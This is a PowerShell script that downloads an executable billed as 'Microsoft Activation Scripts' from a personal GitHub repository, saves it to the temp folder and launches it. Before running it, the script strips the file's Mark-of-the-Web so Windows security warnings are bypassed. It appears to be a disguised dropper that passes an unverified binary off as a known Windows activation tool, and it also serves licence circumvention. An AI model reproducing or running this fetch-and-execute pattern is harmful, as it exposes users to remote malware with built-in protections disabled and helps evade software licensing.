$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
$tempFile = "$env:TEMP\Windows_Activator.exe"


if (Test-Path $tempFile) {
    try {
        Stop-Process -Name "Microsoft Activation Scripts" -ErrorAction SilentlyContinue
        Stop-Process -Name "MAS" -ErrorAction SilentlyContinue
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
    catch {}
}


Invoke-WebRequest -Uri $url -OutFile $tempFile -UserAgent "PowerShell"


try {
    Unblock-File -Path $tempFile
} catch {
    Remove-Item "$tempFile:Zone.Identifier" -Force -ErrorAction SilentlyContinue
}


Start-Process $tempFile
